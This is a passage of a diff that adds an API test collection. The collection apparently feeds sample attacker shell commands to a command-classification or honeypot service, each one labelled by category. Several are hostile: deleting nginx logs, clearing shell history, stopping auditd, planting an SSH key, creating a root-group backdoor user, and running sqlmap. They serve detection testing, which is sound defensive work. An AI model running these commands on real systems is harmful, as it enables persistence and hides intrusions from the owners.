+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"telnet 10.0.0.1 23\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Connection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Initiate telnet session\n\nCommand: `telnet 10.0.0.1 23`\nCategory: `Network Connection`"
+          }
+        },
+        {
+          "name": "ssh user@10.0.0.1",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"ssh user@10.0.0.1\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Connection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Initiate SSH connection\n\nCommand: `ssh user@10.0.0.1`\nCategory: `Network Connection`"
+          }
+        },
+        {
+          "name": "ftp 10.0.0.1",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"ftp 10.0.0.1\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Connection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Initiate FTP connection\n\nCommand: `ftp 10.0.0.1`\nCategory: `Network Connection`"
+          }
+        }
+      ]
+    },
+    {
+      "name": "10. Persistence & Defense Evasion",
+      "item": [
+        {
+          "name": "history -c",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"history -c\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Defense Evasion\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Clear bash command history\n\nCommand: `history -c`\nCategory: `Defense Evasion`"
+          }
+        },
+        {
+          "name": "rm -rf /var/log/nginx",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"rm -rf /var/log/nginx\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Defense Evasion\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Delete web server log files\n\nCommand: `rm -rf /var/log/nginx`\nCategory: `Defense Evasion`"
+          }
+        },
+        {
+          "name": "stop auditd",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"stop auditd\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Defense Evasion\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Stop Linux audit daemon\n\nCommand: `stop auditd`\nCategory: `Defense Evasion`"
+          }
+        },
+        {
+          "name": "echo ssh-rsa AAAAB... >> ~/.ssh/authorized_keys",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"echo \\\"ssh-rsa AAAAB...\\\" >> ~/.ssh/authorized_keys\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Persistence Creation\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Inject SSH public key into authorized_keys\n\nCommand: `echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys`\nCategory: `Persistence Creation`"
+          }
+        },
+        {
+          "name": "useradd -m -g root backdoor",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"useradd -m -g root backdoor\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Persistence Creation\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Create backdoor user with root privileges\n\nCommand: `useradd -m -g root backdoor`\nCategory: `Persistence Creation`"
+          }
+        },
+        {
+          "name": "crontab -e",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"crontab -e\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Persistence Creation\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Edit cron jobs for persistence\n\nCommand: `crontab -e`\nCategory: `Persistence Creation`"
+          }
+        }
+      ]
+    },
+    {
+      "name": "11. Web & Database Attacks",
+      "item": [
+        {
+          "name": "sqlmap -u http://site.com/index.php?id=1 --dbs",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"sqlmap -u \\\"http://site.com/index.php?id=1\\\" --dbs\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"SQL Injection Attempt\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Run SQLMap automated database enumeration\n\nCommand: `sqlmap -u \"http://site.com/index.php?id=1\" --dbs`\nCategory: `SQL Injection Attempt`"
+          }
+        }
+      ]
+    },
+    {
+      "name": "12. System Utilities & Binaries",
+      "item": [
+        {
+          "name": "date",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"date\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"System Utility\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Print current system date and time\n\nCommand: `date`\nCategory: `System Utility`"
+          }
+        },
+        {
+          "name": "env",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"env\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"System Utility\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "List environment variables\n\nCommand: `env`\nCategory: `System Utility`"
+          }
+        },
+        {
+          "name": "printenv",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"printenv\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"System Utility\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Print environment variables\n\nCommand: `printenv`\nCategory: `System Utility`"
+          }
+        },
+        {
+          "name": "echo hello world",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"echo \\\"hello world\\\"\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"System Utility\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Echo string to output\n\nCommand: `echo \"hello world\"`\nCategory: `System Utility`"
+          }
+        },
+        {
+          "name": "which python3",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"which python3\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"System Utility\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Locate python3 binary path\n\nCommand: `which python3`\nCategory: `System Utility`"
+          }
+        },
+        {
+          "name": "which gcc",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"which gcc\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"System Utility\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Locate C compiler binary path\n\nCommand: `which gcc`\nCategory: `System Utility`"
+          }
+        },
+        {
+          "name": "docker ps",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"docker ps\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Container Management\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "List running Docker containers\n\nCommand: `docker ps`\nCategory: `Container Management`"
+          }
+        },
+        {
+          "name": "iptables -L",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"iptables -L\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Firewall Configuration\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "List iptables firewall rules\n\nCommand: `iptables -L`\nCategory: `Firewall Configuration`"
+          }
+        }
+      ]
+    }
+  ]
+}
